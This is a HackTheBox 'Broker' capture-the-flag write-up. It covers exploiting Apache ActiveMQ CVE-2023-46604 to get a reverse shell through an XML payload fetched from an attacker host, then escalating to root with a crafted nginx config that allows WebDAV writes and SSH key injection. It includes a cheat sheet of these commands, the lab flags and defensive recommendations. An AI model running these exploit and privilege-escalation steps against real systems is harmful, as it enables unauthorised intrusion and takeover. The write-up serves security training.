# HTB - Broker - 10.129.230.87

## Broker

> **Platform:** HackTheBox **Difficulty:** Easy **OS:** Linux (Ubuntu) **Key Techniques:** Apache ActiveMQ CVE-2023-46604, Deserialization RCE, Sudo Nginx Abuse, WebDAV File Write, SSH Key Injection

***

### Box Info

| Property   | Value                              |
| ---------- | ---------------------------------- |
| IP         | `10.129.230.87`                    |
| OS         | Ubuntu (OpenSSH 8.9p1)             |
| Difficulty | Easy                               |
| User Flag  | `e7defd46114b5b0efab18790466b4061` |
| Root Flag  | `9a0109b0696fa93d9fb2fa086c6bd2b2` |

***

### Attack Chain Overview

```
Nmap Scan → Default Creds (admin:admin) → ActiveMQ 5.15.15 Identified →
CVE-2023-46604 (Deserialization RCE) → Shell as activemq →
sudo nginx (NOPASSWD) → Nginx as root with DAV → Read root flag / SSH key injection → Root
```

***

### Reconnaissance

#### Nmap Scan

**Full TCP port scan with service/version detection:**

```bash
nmap -p- --min-rate 5000 -vvv -Pn -sCV 10.129.230.87 -oN broker.tcp
```

| Port  | Service    | Details                                        |
| ----- | ---------- | ---------------------------------------------- |
| 22    | SSH        | OpenSSH 8.9p1 Ubuntu                           |
| 80    | HTTP       | nginx 1.18.0 — Basic Auth (ActiveMQRealm)      |
| 1883  | MQTT       | Message Queuing Telemetry Transport            |
| 5672  | AMQP       | Advanced Message Queuing Protocol              |
| 8161  | HTTP       | Jetty 9.4.39 — Basic Auth (ActiveMQRealm)      |
| 37807 | tcpwrapped | Unknown                                        |
| 61613 | STOMP      | Apache ActiveMQ Simple Text Oriented Messaging |
| 61614 | HTTP       | Jetty 9.4.39                                   |
| 61616 | OpenWire   | ActiveMQ OpenWire transport **5.15.15**        |

**Key observations:**

* Multiple ports associated with Apache ActiveMQ — a Java-based message broker
* ActiveMQ version **5.15.15** exposed on OpenWire port 61616
* HTTP interfaces on ports 80 and 8161 both require Basic Auth under the `ActiveMQRealm`
* Presence of MQTT (1883), AMQP (5672), and STOMP (61613) confirms this is a full message broker deployment

***

### Foothold

#### Web Enumeration (Port 80)

Navigating to port 80 triggers a Basic Auth prompt for `ActiveMQRealm`. Testing default credentials:

```
admin:admin
```

This grants access to the Apache ActiveMQ Web Console, confirming:

| Property    | Value                             |
| ----------- | --------------------------------- |
| Broker Name | localhost                         |
| Version     | **5.15.15**                       |
| ID          | ID:broker-34163-1770591178313-0:1 |

#### CVE-2023-46604 — Apache ActiveMQ RCE

**What is CVE-2023-46604?**

CVE-2023-46604 is a critical (CVSS 10.0) Remote Code Execution vulnerability in Apache ActiveMQ versions prior to 5.15.16, 5.16.7, 5.17.6, and 5.18.3. It exploits the OpenWire protocol (port 61616) by sending a specially crafted `ClassPathXmlApplicationContext` serialized object. ActiveMQ deserializes this object, which causes it to fetch and parse an attacker-controlled XML file — that XML defines a Spring bean that executes arbitrary OS commands.

**Why it works:**

ActiveMQ's OpenWire transport deserializes incoming Java objects without proper validation. The attacker sends a serialized `ClassPathXmlApplicationContext` pointing to a malicious XML file hosted on the attacker's machine. When ActiveMQ processes this object, Spring loads the XML and instantiates a bean that runs system commands.

**Step 1: Set up the exploit and payload**

Clone the PoC exploit (e.g., from SwiHak's CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ or similar). The exploit sends the serialized payload to the OpenWire port and requires a `poc-linux.xml` file hosted on the attacker's HTTP server.

The `poc-linux.xml` contains a Spring bean definition that executes a reverse shell command.

**Step 2: Start an HTTP server to host the XML payload:**

```bash
sudo python3 -m http.server 80
```

**Step 3: Start a netcat listener:**

```bash
nc -lvnp 9999
```

**Step 4: Run the exploit:**

```bash
python exploit.py -i 10.129.230.87 -p 61616 -u http://<ATTACKER_IP>/poc-linux.xml
```

* `-i` — Target IP running ActiveMQ
* `-p` — OpenWire transport port (61616)
* `-u` — URL to the malicious XML file hosted on the attacker

**Result — Reverse shell as `activemq`:**

```
Connection received on 10.129.230.87 36342
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

The HTTP server confirms the target fetched the XML:

```
10.129.230.87 - - "GET /poc-linux.xml HTTP/1.1" 200 -
```

***

### User Flag

```
activemq@broker:~$ cat /home/activemq/user.txt
e7defd46114b5b0efab18790466b4061
```

***

### Post-Exploitation Enumeration

#### ActiveMQ Configuration Files

The ActiveMQ configuration directory at `/opt/apache-activemq-5.15.15/conf/` contains credential files:

**credentials.properties (plaintext):**

```
activemq.username=system
activemq.password=manager
guest.password=password
```

**credentials-enc.properties (encrypted):**

```
activemq.username=system
activemq.password=ENC(mYRkg+4Q4hua1kvpCCI2hg==)
guest.password=ENC(Cf3Jf3tM+UrSOoaKU50od5CuBa8rxjoL)
```

| Username | Password | Source                 |
| -------- | -------- | ---------------------- |
| system   | manager  | credentials.properties |
| guest    | password | credentials.properties |

#### Sudo Privileges

```bash
sudo -l
```

```
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

The `activemq` user can run `/usr/sbin/nginx` as **any user** (including root) **without a password**. This is the privilege escalation vector.

***

### Privilege Escalation — Sudo Nginx Abuse

**What is this technique?**

When a user can run `nginx` with sudo, they can supply a custom configuration file that makes nginx run as root and serve the entire filesystem. Combined with WebDAV (`dav_methods PUT`), this allows both reading and writing files as root.

**Why it works:**

Nginx's `user` directive controls which OS user the worker processes run as. With sudo, we control the config, so we set `user root` — making the web server operate with full root privileges. The `root /` directive serves the entire filesystem, and `dav_methods PUT` enables file uploads.

#### Step 1: Create a malicious Nginx configuration

```bash
cat > /tmp/nginx.conf << 'EOF'
user root;
worker_processes auto;
events {
    worker_connections 768;
}
http {
    server {
        listen      1338;
        server_name localhost;
        root        /;
        dav_methods PUT;
        autoindex   on;
    }
}
EOF
```

| Directive         | Purpose                                       |
| ----------------- | --------------------------------------------- |
| `user root`       | Worker processes run as root                  |
| `listen 1338`     | Avoid conflict with existing nginx on port 80 |
| `root /`          | Serve the entire filesystem                   |
| `dav_methods PUT` | Allow writing files via HTTP PUT              |
| `autoindex on`    | Enable directory listing (browsing)           |

#### Step 2: Start nginx with the malicious config

```bash
sudo /usr/sbin/nginx -c /tmp/nginx.conf
```

#### Step 3: Read the root flag

The entire filesystem is now accessible. Navigate to:

```
http://10.129.230.87:1338/root/root.txt
```

```
9a0109b0696fa93d9fb2fa086c6bd2b2
```

#### Step 4 (Optional): Get a root shell via SSH key injection

For a full root shell, write your SSH public key to root's `authorized_keys`:

```bash
# Generate a key pair (if you don't have one)
ssh-keygen -t ed25519 -f broker_root -N ''

# Upload the public key via WebDAV PUT
curl -X PUT http://10.129.230.87:1338/root/.ssh/authorized_keys \
  -d "$(cat broker_root.pub)"

# SSH as root
ssh -i broker_root root@10.129.230.87
```

***

### Quick Reference

```bash
# Nmap full scan
nmap -p- --min-rate 5000 -vvv -Pn -sCV <TARGET> -oN broker.tcp

# Default creds for ActiveMQ web console
admin:admin

# CVE-2023-46604 exploit (ActiveMQ RCE via OpenWire)
python exploit.py -i <TARGET> -p 61616 -u http://<ATTACKER_IP>/poc-linux.xml

# Host payload
sudo python3 -m http.server 80

# Listener
nc -lvnp 9999

# Check sudo
sudo -l

# Malicious nginx config → /tmp/nginx.conf
sudo /usr/sbin/nginx -c /tmp/nginx.conf

# Read files as root
curl http://<TARGET>:1338/root/root.txt

# Write SSH key for root shell
curl -X PUT http://<TARGET>:1338/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_ed25519.pub)"
ssh root@<TARGET>
```

***

### Troubleshooting

| Issue                                    | Solution                                                                                                                                                                                                   |
| ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Exploit script fails to connect on 61616 | Verify the OpenWire port is open. Some exploit scripts require Python 2 — check shebang or run with `python2`                                                                                              |
| Target doesn't fetch the XML payload     | Ensure your HTTP server is running and accessible. Check firewall rules. Verify the URL in the exploit matches your listener IP exactly                                                                    |
| Reverse shell dies immediately           | Upgrade to a stable shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'` then `Ctrl+Z`, `stty raw -echo; fg`                                                                                            |
| Nginx fails to start on port 1338        | Port may already be in use. Change the listen port in the config. Also check if an existing nginx master process needs to be stopped first with `sudo /usr/sbin/nginx -s stop` before starting the new one |
| PUT method returns 405                   | Ensure `dav_methods PUT;` is inside the `server` block. Restart nginx after config changes                                                                                                                 |
| SSH key injection doesn't work           | Verify `/root/.ssh/` directory exists. Check permissions — `authorized_keys` must be readable by root. Ensure you uploaded the `.pub` file content, not the private key                                    |

***

### Key Takeaways

**What we learned:**

1. **Default credentials are still a critical risk** — ActiveMQ's `admin:admin` default gave us version information and confirmed the attack surface
2. **CVE-2023-46604 is devastating** — A CVSS 10.0 deserialization flaw in ActiveMQ's OpenWire protocol gives unauthenticated RCE. Always patch message brokers immediately
3. **Sudo on service binaries is dangerous** — Allowing sudo on `nginx` (or any configurable service) lets an attacker supply their own config, effectively gaining root-level file system access
4. **WebDAV enables write primitives** — Nginx's `dav_methods` directive turns a read-only web server into a file write primitive, enabling SSH key injection for persistent root access
5. **Configuration files often contain credentials** — ActiveMQ stores plaintext and weakly encrypted passwords in its conf directory

**Attack chain summary:**

```
Default Creds → ActiveMQ 5.15.15 → CVE-2023-46604 (Deserialization RCE) → activemq shell → sudo nginx → Root FS access + write via DAV → Root
```

**Defense recommendations:**

* Change all default credentials on ActiveMQ and any deployed services immediately after installation
* Patch Apache ActiveMQ to version 5.15.16+ / 5.16.7+ / 5.17.6+ / 5.18.3+ to remediate CVE-2023-46604
* Never grant sudo on configurable services like nginx, Apache, or other daemons — attackers can supply malicious configurations
* If sudo on nginx is required, restrict it with `sudoers` arguments (e.g., only allow specific config files)
* Restrict outbound network access from production servers to prevent reverse shell callbacks and payload fetching
* Store credentials encrypted with strong algorithms and never in plaintext configuration files
* Implement network segmentation — message broker ports (61616, 1883, 5672) should not be exposed to untrusted networks

***

### Related Topics

* \[\[CVE-2023-46604]]
* \[\[Apache ActiveMQ]]
* \[\[Java Deserialization Attacks]]
* \[\[Sudo Privilege Escalation]]
* \[\[Nginx Misconfiguration]]
* \[\[WebDAV Exploitation]]
* \[\[SSH Key Injection]]
* \[\[OpenWire Protocol]]

***

### Tags

`#activemq` `#cve-2023-46604` `#deserialization` `#sudo-nginx` `#nginx-dav` `#file-write` `#ssh-key-injection` `#oscp-like` `#htb-easy` `#linux`
